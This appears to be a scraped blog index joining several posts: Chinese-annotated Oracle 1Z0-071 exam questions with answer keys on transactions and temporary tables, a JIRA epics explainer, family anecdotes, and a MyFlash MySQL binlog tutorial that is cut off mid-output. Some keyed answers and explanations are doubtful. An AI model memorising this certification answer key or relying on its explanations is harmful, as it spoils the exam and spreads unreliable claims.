事务和锁机制 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the BOOKS table: The table has 100 rows. Examine this sequence of statements issued in a new session: INSERT INTO books VALUES (‘ADV112’, ‘Adventures of Tom Sawyer’, NULL, NULL) SAVEPOINT a; DELETE FROM books; ROLLBACK TO SAVEPOINT a; ROLLBACK; Which statement is true? A. Both ROLLBACR commands restore the 101 rows that were deleted B. Both ROLLBACR commands restore the 100 rows that were deleted. C. The first rollback restores the 101 rows that were deleted and the second rollback causes the row that was inserted to be deleted and commits the changes. D. The first rollback restores the 100 rows that were deleted and the second rollback commits only the changes. Correct Answer: C Explanation/Reference: 考点：事务第一次回滚将恢复被删除的101行，第二次回滚将恢复所导致的101行插入要删除的行并提交更改 QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding savepoints？ A. Savepoints are effective only for commit. B. Savepoints may be used to ROLLBACK. C. Savepoints can be used for only DML statements. D. Savepoints are effective for both coMMi and ROLLBACR. E. Savepoints can be used for both DML and DDL statements. Correct Answer: BC Explanation/Reference: 考点：事务 B 对 Savepoints可以回滚 C 对 Savepoints只能用于DM语句 QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the BOOKS table: The table has 100 rows. Examine this sequence of statements issued in a new session: INSERT INTO books VALUES (‘ADV112’, ‘Adventures of Tom Sawyer’, NULL, NULL) SAVEPOINT a; DELETE FROM books; ROLLBACK TO SAVEPOINT a; ROLLBACK; Which two statements are true? A. The first ROLLBACK command restores the 101 rows that were deleted and commits the inserted row. B. The first ROLLBACK command restores the 101 rows that were deleted, leaving the inserted row still to be committed. C. The second ROLLBACK command does nothing. D. The second ROLLBACK command undoes the insert. E. The second ROLLBACK command replays the delete. Correct Answer: BD Explanation/Reference: 考点：事务分析：BD A 错说的是提交 B 对说的是需要提交 C 错回滚有内容 D 对撤销 savepoint 的更新 E 错撤销操作不是删除操作 SCOTT@testdb&gt;select * from zyadmin; ID NAME 5 kk 4 boo 1 superman 2 batman 3 wonder SCOTT@testdb&gt;insert into zyadmin values (6,&apos;bo&apos;); 1 row created. SCOTT@testdb&gt;savepoint a; Savepoint created. SCOTT@testdb&gt;select * from zyadmin; ID NAME 6 bo 5 kk 4 boo 1 superman 2 batman 3 wonder 6 rows selected. SCOTT@testdb&gt;delete from zyadmin; 6 rows deleted. SCOTT@testdb&gt;select * from zyadmin; no rows selected SCOTT@testdb&gt;rollback to savepoint a; Rollback complete. SCOTT@testdb&gt;select * from zyadmin; ID NAME 6 bo 5 kk 4 boo 1 superman 2 batman 3 wonder 6 rows selected. SCOTT@testdb&gt;rollback; Rollback complete. SCOTT@testdb&gt;select * from zyadmin; ID NAME 5 kk 4 boo 1 superman 2 batman 3 wonder QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine these statements executed in a single Oracle session: create table product (pcode number(2), pname varchar2(20)); insert into product values (1. &apos;pen&apos;); insert into product values (2, &apos;pencil&apos;); insert into product values (3, &apos;fountain pen&apos;); savepoint a; update product set pcode=10 where pcode=1; commit; delete from product where pcode=2; savepoint b; update product set pcode=30 where pcode=3; savepoint c; delete from product where pcode=10; rollback to savepoint b; commit; Which three statements are true? A. There is no row containing fountain pen. B. The code for pen IS 10. C. The code for pen IS 1. D. The code for fountain pen IS 3. E. There is no row containing pencil. F. There is no row containing pen. Correct Answer: BDE Explanation/Reference: 考点：事务题目中一共三个完整的事务：第一个事务：创建表product第二个事务：插入3行数据；保存点a；更新一行；提交事务。 1 pen 2 pencil 3 fountain pen ------ a 10 pen 2 pencil 3 fountain pen 第三个事务：删除pcode=2的行；保存点b；更新pcode=3的行；保存点c；删除pcode=10的行；回滚到保存点b；提交事务。 10 pen 3 fountain pen ------ b 10 pen 30 fountain pen ------ c 30 fountain pen 回滚到b 10 pen 3 fountain pen QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true regarding a SAVEPOINT? A. Rolling back to a SAVEPOINT can undo a CREATE INDEX statement. B. Only one SAVEPOINT may be issued in a transaction. C. A SAVEPOINT does not issue a COMMIT. D. Rolling back to a SAVEPOINT can undo a TRUNCATE statement. E. Rolling back to a SAVEPOINT can undo a DELETE statement. Correct Answer: CE Explanation/Reference: 考点：事务 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 In which three situations does a new transaction always start? A. When issuing the first Data Manipulation Language(DML) statement after a COMMIT or ROLLBACK statement was issued in the same session. B. When issuing a TRUNCATE statement after a SELECT statement was issued in the same session. C. When issuing a CREATE INDEX statement after a CREATE TABLE statement completed successfully in the same session. D. When issuing a CREATE TABLE statement after a SELECT statement was issued in the same session. E. When issuing a SELECT FOR UPDATE statement after a CREATE TABLE AS SELECT statement was issued in the same session. F. When issuing a DML statement after a DML statement failed in the same session. Correct Answer: ACE Explanation/Reference: 考点：事务 A 对 commit 后 DML B 错 DML后 DDL C 对 DDL语句自动提交后，新的DDL就是新事务的开始也是新事务的结束 D 错 DML后 DDL E 对 DDL是 DML F 错 DML执行失败，事务不会自动提交 QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 An Oracle database server session has an uncommitted transaction in progress which updated 5000 rows in a table. In which three situations does the transaction complete thereby committing the updates? A. When the session logs out successfully B. When a DBA issues a successful SHUTDOWN IMMEDIATE statement and the user then issues a COMMIT C. When a CREATE INDEX statement is executed successfully in same session D. When a COMMIT statement is issued by the same user from another session in the same database instance E. When a CREATE TABLE AS SELECT statement is executed unsuccessfully in the same session F. When a DBA issues a successful SHUTDOWN TRANSACTIONAL statement and the user then issues a COMMIT Correct Answer: ACF Explanation/Reference: 分析：ACF B 错没保存的会回滚 D 错当前会话没提交 E 错执行不成功不会提交 QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about Data Manipulation Language (DML)? A. DELETE statements can remove multiple rows based on multiple conditions. B. INSERT INTO...SELECT...FROM statements automatically commit. C. INSER statements can insert NULLS explicitly into a column. D. UPDATE statements can have different subqueries to specfy the values for each updated column. E. DML statements require a primary key be defined on a table. Correct Answer: ACD Explanation/Reference: 分析：ACD B 错 DDL才会自动提交 E 错可以不建立主键 QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about GLOBAL TEMPORARY TABLES? A. A DELETE command on a GLOBAL TEMPORARY TABLE cannot be rolled back. B. GLOBAL TEMPORARY TABLE rows inserted by a session are available to any other session whose user has been granted select on the table C. Any GLOBAL TEMPORARY TABLE rows existing at session termination will be deleted. D. A GLOBAL TEMPORARY TABLE&apos;S definition is available to multiple sessions. E. GLOBAL TEMPORARY TABILE Space allocation occurs at session start. F. TRUNCATE command issued in a session causes all rows in a GLOBAL TEMPORARY TABLE for the issuing session to be deleted. Correct Answer: ACF Explanation/Reference: 分析：ACF A 对临时表不能 rollback B 错 commit 或者 rollback 后才能在其他用户查询，临时表会被清空 C 对多窗口查询需要 commit 或者 rollback D 错当前事务窗口生效 E 错跟延时段有关 F 对临时表用于测试，功能跟普通表一样 QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about GLOBAL. TEMPORARY TABLES? A. A GLOBAL TEMPORARY TABLE cannot have a PUBLIC SYNONYM. B. A GLOBAL TEMPORARY TABLE can have multiple indexes. C. A GLOBAL TEMPORARY TABLE can be referenced in the defining query of a view. D. Data Manipulation Language (DML) on GLOBAL TEMPORARY TABLES generates no REDO. E. A GLOBAL TEMPORARY TABLE can have only one index. F. A trigger can be created on a GLOBAL TEMPORARY TABTE. Correct Answer: BCF Explanation/Reference: 分析：BCF D 错 commit 或者 rollback 就清空了，不能 redo 到旧数据。临时表用于测试，功能和普通表一样。会回滚测试过触发器可以用于创建临时表，功能在 关于GLOBAL临时表，哪三个陈述是正确的 ? A GLOBAL TEMPORARY TABLE cannot have a PUBLIC SYNONYM. A) 全局临时表不能有公共同义词。错误 A GLOBAL TEMPORARY TABLE can have multiple indexes. B) 全局临时表可以有多个索引。正确 A GLOBAL TEMPORARY TABLE can be referenced in the defining query of a view. C)在视图的定义查询中可以引用全局临时表。可以 Data Manipulation Language (DML) on CLOBAL TEMPORARY TABLES generates no REDO. D)数据操作语言 (DML)对CLOBAL临时表不产生重做。错误 A GLOBAL TEMPORARY TABLE can have only one index. E)全局临时表只能有一个索引。错误 A trigger can be created on a GLOBAL TEMPORARY TABTE. F) 可以在全局临时选项卡上创建触发器。正确 考点：全局临时表 1. 创建SQL语句 CREATE GLOBAL TEMPORARY TABLE tablename (columns) [ ON COMMIT PRESERVE | DELETE ROWS ] SQL&gt; create global temporary table emp_temp(eno number) on commit delete rows; -- transaction level duration，事务级别，此为默认选项 SQL&gt; create global temporary table emp_temp(eno number) on commit preserve rows; -- session level duration，会话级别 2. 隔离性：数据只在会话或者事务级别可见。不同用户可以使用同一个临时表，但是看到的都是各自的数据。 3. 表上可以创建索引、视图、触发器等对象。 4. 索引只有在临时表是empty时可创建。 5. 临时表不产生数据的redo，但是会生成undo的redo。 6. 临时表目前只支持GLOBAL的，所以创建语句为create global temporary table XXX。 7. 使用truncate只对当前会话有效。 8. 不能export/import表上的数据，只能导入导出表定义。 9. 临时段在第一次insert或CATS时产生。 缺点： 1. 表定义不能自动drop。 2. 临时表目前只支持GLOBAL。 3. 只有无会话时才能DDL，否则可能报错： ORA-14452: attempt to create, alter or drop an index on temporary table already in use 4. 临时表上默认不收集统计信息，如果需要收集统计信息，首先要确保临时表属性为ON COMMIT PRESERVE ROWS。 收集统计信息命令：analyze table table_name compute statistics; QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about transactions in the oracle Database server? A. An uncommitted transaction commits automatically if the user exits SQL*Plus B. Data Manipulation Language (DML) statements always start a new transaction. C. A user can always see uncommitted updates made by the same user in a different session. D. A Data Definition Language (DDL) statement does a commit automatically only for the data dictionary updates caused by the DDL. E. A session can always see uncommitted updates made by itself. F. If a session has an uncommitted transaction, then a DDL statement issues a commit before starting a new transaction. Correct Answer: AE Explanation/Reference: 关于oracle数据库服务器中的事务，哪两个语句是正确的? A) An uncommitted transaction commits automatically if the user exits SQL*Plus A) 如果用户退出SQL*Plus，未提交的事务将自动提交正确 B)数据操作语言 (DML)语句总是启动一个新的事务。B) Data Manipulation Language (DML) statements always start a new transaction. 错误 C)用户总是可以在不同的会话中看到同一用户未提交的更新。 C) A user can always see uncommitted updates made by the same user in a different session. 错误，事务的隔离级别不允许看到未提交的事务 D)数据定义语言 (DDL)语句仅对由DDL引起的数据字典更新自动执行提交。D) A Data Definition Language (DDL) statement does a commit automatically only for the data dictionary updates caused by the DDL.错误，DDL都是自动提交事务 E)一个会话总是可以看到它自己做出的未提交的更新。 A session can always see uncommitted updates made by itself. 正确 F)如果一个会话有一个未提交的事务，那么DDL语句在开始一个新事务之前发出一个提交。错误，应该时DDL在执行之后会发出一个提交。 If a session has an uncommitted transaction, then a DDL statement issues a commit before starting a new transaction.在session A中执行 在session B中查看，因为A的事务没有提交，因此B中看不到id为6的行 在session A中继续执行一条alter操作 在session B中查看，可以看到id=6的行记录。","link":"/2020/05/06/ocp/Oracle12c/1z0-071/1z0-071/"},{"title":"JIRA中的史诗、故事、版本与冲刺","text":"史诗, 故事, 版本与冲刺　　这四驾马车能够优雅地管理敏捷过程的范围和时间表。并构建工作。 Jira史诗(Epic)是一个大型用户故事，根据客户或最终用户需求分解为较小的任务(用户故事)。 根据客户需求，根据需要在史诗中添加或删除任务。 Epic用于组织工作和创建层次结构。。 Epic通过将更大的任务组织成更小的任务来保持敏捷性。。 Epic是工作层次结构的顶层，开发人员使用它。。 Epic是更大的故事，具有明显的开始和结束。。 Epic可以跨越多个冲刺，即，史诗是通过多个冲刺传递的。。 Epic可以包含故事，错误和任务，并将它们分组成一个大故事。。 当Epic包含故事，错误或任务时，所有这些问题类型都表示在Jira的层次结构中的同一级别。。 故事，错误，任务代表单件作品，而史诗则是一组相关问题。","link":"/2020/05/06/booboo_others/2020-05-06-tec-jira-md/"},{"title":"Amy经典语录-第六篇","text":"新冠状病毒在中国应该已快到达终点，国外疫情还非常严重，人类加油。有孩子的陪伴，足矣 场景-改名风波临睡觉前 小慈：妈咪，我想换个名字 YY：宝贝，你想叫什么名字啊？ 小慈：奶奶说你怀孕的时候非常喜欢吃橘子，以后我就叫小橘子吧！！！ YY：小橘子，哇这个名字不错哦，那英文名怎么办？ 小慈：英文名就叫AmyOrange！ YY：没问题小橘子，那大名要改吗？ 小慈：那就叫 严魏小橘子 场景-不穿裙子了早晨在起床前 小慈：妈妈我不要穿裙子了 YY：为什么呀？难道不想做女生了？ 小慈：我昨天认识了一个新朋友，她跳绳非常厉害 YY：那你有向她请教跳绳的秘诀吗？ 小慈：不能穿裙子，和妈妈一起跳绳。","link":"/2020/05/08/amy_life/2020-05-08-amy/"},{"title":"开源工具-MyFlash工具","text":"生产中使用binlog2sql较多，但也有缺点例如速度不够快；不支持blob的列，因此使用美团开源的myflash试试。 开源工具-MyFlash工具 详细说明 限制 FAQ 使用实践 安装MyFlash 查看帮助 测试使用 检查mysql日志参数 创建测试表 插入测试数据 回滚 如何对阿里云RDS进行闪回 阿里云的binlog获取方法 处理binlog日志的备注信息 其他方法 开源工具-MyFlash工具MyFlash是由美团点评公司技术工程部开发维护的一个回滚DML操作的工具。该工具通过解析v4版本的binlog，完成回滚操作。相对已有的回滚工具，其增加了更多的过滤选项，让回滚更加容易。 该工具已经在美团点评内部使用 详细说明 安装 使用 测试用例 限制 binlog格式必须为row,且binlog_row_image=full 仅支持5.6与5.7 只能回滚DML（增、删、改） FAQ 实现的原理是什么？ 答：参考文章http://url.cn/5yVTfLY 支持gtid吗？ 答：支持。请参考 使用 在开启gtid的MySQL server上，应用flashback报错，错误为：ERROR 1782 (HY000) at line 16: @@SESSION.GTID_NEXT cannot be set to ANONYMOUS when @@GLOBAL.GTID_MODE = ON. ? 答：在导入时加入–skip-gtidsmysqlbinlog –skip-gtids | mysql -uxxx -pxxx 如果回滚后的binlog日志尺寸超过20M，在导入时，很耗时。如何处理? 答：参考 使用 ,搜索maxSplitSize。使用该参数可以对文件进行切片 使用实践安装MyFlash123456git clone https://github.com/Meituan-Dianping/MyFlash.gitcd MyFlashyum install glib2* -ygcc -w `pkg-config --cflags --libs glib-2.0` source/binlogParseGlib.c -o binary/flashbackcp binary/flashback /usr/local/bin/which flashback 查看帮助执行flashback --help查看帮助 123456789101112131415161718192021[root@node1 MyFlash]# flashback --helpUsage: flashback [OPTION?]Help Options: -h, --help Show help optionsApplication Options: --databaseNames databaseName to apply. if multiple, seperate by comma(,) --tableNames tableName to apply. if multiple, seperate by comma(,) --start-position start position --stop-position stop position --start-datetime start time (format %Y-%m-%d %H:%M:%S) --stop-datetime stop time (format %Y-%m-%d %H:%M:%S) --sqlTypes sql type to filter . support INSERT, UPDATE ,DELETE. if multiple, seperate by comma(,) --maxSplitSize max file size after split, the uint is M --binlogFileNames binlog files to process. if multiple, seperate by comma(,) --outBinlogFileNameBase output binlog file name base --logLevel log level, available option is debug,warning,error --include-gtids gtids to process --exclude-gtids gtids to skip 下面的这些参数是可以任意组合的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950511.databaseNames指定需要回滚的数据库名。多个数据库可以用“,”隔开。如果不指定该参数，相当于指定了所有数据库。2.tableNames指定需要回滚的表名。多个表可以用“,”隔开。如果不指定该参数，相当于指定了所有表。3.start-position指定回滚开始的位置。如不指定，从文件的开始处回滚。请指定正确的有效的位置，否则无法回滚4.stop-position指定回滚结束的位置。如不指定，回滚到文件结尾。请指定正确的有效的位置，否则无法回滚5.start-datetime指定回滚的开始时间。注意格式必须是 %Y-%m-%d %H:%M:%S。 如不指定，则不限定时间6.stop-datetime指定回滚的结束时间。注意格式必须是 %Y-%m-%d %H:%M:%S。 如不指定，则不限定时间7.sqlTypes指定需要回滚的sql类型。目前支持的过滤类型是INSERT, UPDATE ,DELETE。多个类型可以用“,”隔开。8.maxSplitSize一旦指定该参数，对文件进行固定尺寸的分割（单位为M），过滤条件有效，但不进行回滚操作。该参数主要用来将大的binlog文件切割，防止单次应用的binlog尺寸过大，对线上造成压力9.binlogFileNames指定需要回滚的binlog文件，目前只支持单个文件，后续会增加多个文件支持10.outBinlogFileNameBase指定输出的binlog文件前缀，如不指定，则默认为binlog_output_base.flashback11.logLevel仅供开发者使用，默认级别为error级别。在生产环境中不要修改这个级别，否则输出过多12.include-gtids指定需要回滚的gtid,支持gtid的单个和范围两种形式。13.exclude-gtids指定不需要回滚的gtid，用法同include-gtids 测试使用检查mysql日志参数12show variables like &apos;binlog_format&apos;;show variables like &apos;binlog_row_image&apos;; 创建测试表12345678910111213141516create database booboo;CREATE TABLE `booboo`.`testFlashback2` ( `id` int(11) NOT NULL AUTO_INCREMENT, `nameShort` varchar(20) DEFAULT NULL, `nameLong` varchar(260) DEFAULT NULL, `amount` decimal(19,9) DEFAULT NULL, `amountFloat` float DEFAULT NULL, `amountDouble` double DEFAULT NULL, `createDatetime6` datetime(6) DEFAULT NULL, `createDatetime` datetime DEFAULT NULL, `createTimestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, `nameText` text, `nameBlob` blob, `nameMedium` mediumtext, PRIMARY KEY (`id`)) ENGINE=InnoDB; 插入测试数据1234flush logsinsert into testFlashback2(nameShort,nameLong,amount,amountFloat,amountDouble,createDatetime6,createDatetime,createTimestamp,nameText,nameBlob,nameMedium) values(&apos;aaa&apos;,&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos;,10.5,10.6,10.7,&apos;2017-10-26 10:00:00&apos;,&apos;2017-10-26 10:00:00&apos;,&apos;2017-10-26 10:00:00&apos;,&apos;cccc&apos;,&apos;dddd&apos;,&apos;eee&apos;);insert into testFlashback2(nameShort,nameLong,amount,amountFloat,amountDouble,createDatetime6,createDatetime,createTimestamp,nameText,nameBlob,nameMedium) values(&apos;aaa&apos;,&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos;,10.5,10.6,10.7,&apos;2017-10-26 10:00:00&apos;,&apos;2017-10-26 10:00:00&apos;,&apos;2017-10-26 10:00:00&apos;,&apos;cccc&apos;,&apos;dddd&apos;,&apos;eee&apos;);flush logs; 查看插入的数据 12345678910111213141516171819202122232425262728293031root@localhost [booboo]&gt;select * from testFlashback2\\G;*************************** 1. row *************************** id: 1 nameShort: aaa nameLong: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb amount: 10.500000000 amountFloat: 10.6 amountDouble: 10.7createDatetime6: 2017-10-26 10:00:00.000000 createDatetime: 2017-10-26 10:00:00createTimestamp: 2017-10-26 10:00:00 nameText: cccc nameBlob: dddd nameMedium: eee*************************** 2. row *************************** id: 2 nameShort: aaa nameLong: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb amount: 10.500000000 amountFloat: 10.6 amountDouble: 10.7createDatetime6: 2017-10-26 10:00:00.000000 createDatetime: 2017-10-26 10:00:00createTimestamp: 2017-10-26 10:00:00 nameText: cccc nameBlob: dddd nameMedium: eee2 rows in set (0.00 sec)ERROR:No query specified 回滚 找到对应的binlog日志 /alidata/mysql/log/mysql-bin.000078 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136root@localhost [booboo]&gt;show binary logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000077 | 5991 || mysql-bin.000078 | 1348 || mysql-bin.000079 | 191 |+------------------+-----------+3 rows in set (0.00 sec)root@localhost [booboo]&gt;exit;Bye[root@node1 MyFlash]# cd /alidata/mysql/bin/ data/ include/ log/ my.cnf README share/ support-files/COPYING docs/ lib/ man/ mysql-test/ scripts/ sql-bench/ tmp/[root@node1 MyFlash]# cd /alidata/mysql/log/mysql-bin.000077 mysql-bin.000078 mysql-bin.000079 mysql-bin.index test.sql[root@node1 MyFlash]# cd /alidata/mysql/log/[root@node1 log]# ll总用量 24-rw-rw----. 1 mysql mysql 5991 5月 8 17:08 mysql-bin.000077-rw-rw----. 1 mysql mysql 1348 5月 8 17:09 mysql-bin.000078-rw-rw----. 1 mysql mysql 191 5月 8 17:09 mysql-bin.000079-rw-rw----. 1 mysql mysql 108 5月 8 17:09 mysql-bin.index[root@node1 log]# mysqlbinlog -v -v mysql-bin.000078/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=1*/;/*!40019 SET @@session.max_insert_delayed_threads=0*/;/*!50003 SET @OLD_COMPLETION_TYPE=@@COMPLETION_TYPE,COMPLETION_TYPE=0*/;DELIMITER /*!*/;# at 4#200508 17:08:40 server id 1003306 end_log_pos 120 CRC32 0x2b689980 Start: binlog v 4, server v 5.6.45-log created 200508 17:08:40BINLOG &apos;mCG1Xg8qTw8AdAAAAHgAAAAAAAQANS42LjQ1LWxvZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEzgNAAgAEgAEBAQEEgAAXAAEGggAAAAICAgCAAAACgoKGRkAAYCZaCs=&apos;/*!*/;# at 120#200508 17:08:40 server id 1003306 end_log_pos 191 CRC32 0x51646940 Previous-GTIDs# 8ae1b527-bd2c-11e9-b46d-000c296330ff:1-9# at 191#200508 17:09:12 server id 1003306 end_log_pos 239 CRC32 0x285c9356 GTID [commit=yes]SET @@SESSION.GTID_NEXT= &apos;8ae1b527-bd2c-11e9-b46d-000c296330ff:10&apos;/*!*/;# at 239#200508 17:09:12 server id 1003306 end_log_pos 321 CRC32 0x59cb1159 Query thread_id=31 exec_time=0 error_code=0SET TIMESTAMP=1588928952/*!*/;SET @@session.pseudo_thread_id=31/*!*/;SET @@session.foreign_key_checks=1, @@session.sql_auto_is_null=0, @@session.unique_checks=1, @@session.autocommit=1/*!*/;SET @@session.sql_mode=1075838976/*!*/;SET @@session.auto_increment_increment=1, @@session.auto_increment_offset=1/*!*/;/*!\\C utf8 *//*!*/;SET @@session.character_set_client=33,@@session.collation_connection=33,@@session.collation_server=45/*!*/;SET @@session.time_zone=&apos;SYSTEM&apos;/*!*/;SET @@session.lc_time_names=0/*!*/;SET @@session.collation_database=DEFAULT/*!*/;BEGIN/*!*/;# at 321#200508 17:09:12 server id 1003306 end_log_pos 406 CRC32 0x541898f4 Table_map: `booboo`.`testflashback2` mapped to number 74# at 406#200508 17:09:12 server id 1003306 end_log_pos 715 CRC32 0x9df50e18 Write_rows: table id 74 flags: STMT_END_FBINLOG &apos;uCG1XhMqTw8AVQAAAJYBAAAAAEoAAAAAAAEABmJvb2JvbwAOdGVzdGZsYXNoYmFjazIADAMPD/YEBRISEfz8/A5QABAEEwkECAYAAAICA/4O9JgYVA==uCG1Xh4qTw8ANQEAAMsCAAAAAEoAAAAAAAEAAgAM//8A8AEAAAADYWFhzQBiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJigAAAAAodzWUAmpkpQWZmZmZmZiVAmZ30oAAAAACZnfSgAFnxQaAEAGNjY2MEAGRkZGQDAABlZWUYDvWd&apos;/*!*/;### INSERT INTO `booboo`.`testflashback2`### SET### @1=1 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;aaa&apos; /* VARSTRING(80) meta=80 nullable=1 is_null=0 */### @3=&apos;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&apos; /* VARSTRING(1040) meta=1040 nullable=1 is_null=0 */### @4=10.500000000 /* DECIMAL(19,9) meta=4873 nullable=1 is_null=0 */### @5=10.6 /* FLOAT meta=4 nullable=1 is_null=0 */### @6=10.699999999999999289 /* DOUBLE meta=8 nullable=1 is_null=0 */### @7=&apos;2017-10-26 10:00:00.000000&apos; /* DATETIME(6) meta=6 nullable=1 is_null=0 */### @8=&apos;2017-10-26 10:00:00&apos; /* DATETIME(0) meta=0 nullable=1 is_null=0 */### @9=1508983200 /* TIMESTAMP(0) meta=0 nullable=0 is_null=0 */### @10=&apos;cccc&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @11=&apos;dddd&apos; /* BLOB/TEXT meta=2 nullable=1 is_null=0 */### @12=&apos;eee&apos; /* MEDIUMBLOB/MEDIUMTEXT meta=3 nullable=1 is_null=0 */# at 715#200508 17:09:12 server id 1003306 end_log_pos 746 CRC32 0x637a4759 Xid = 153COMMIT/*!*/;# at 746#200508 17:09:12 server id 1003306 end_log_pos 794 CRC32 0x6df52572 GTID [commit=yes]SET @@SESSION.GTID_NEXT= &apos;8ae1b527-bd2c-11e9-b46d-000c296330ff:11&apos;/*!*/;# at 794#200508 17:09:12 server id 1003306 end_log_pos 876 CRC32 0x6944db63 Query thread_id=31 exec_time=0 error_code=0SET TIMESTAMP=1588928952/*!*/;BEGIN/*!*/;# at 876#200508 17:09:12 server id 1003306 end_log_pos 961 CRC32 0xb3177cd9 Table_map: `booboo`.`testflashback2` mapped to number 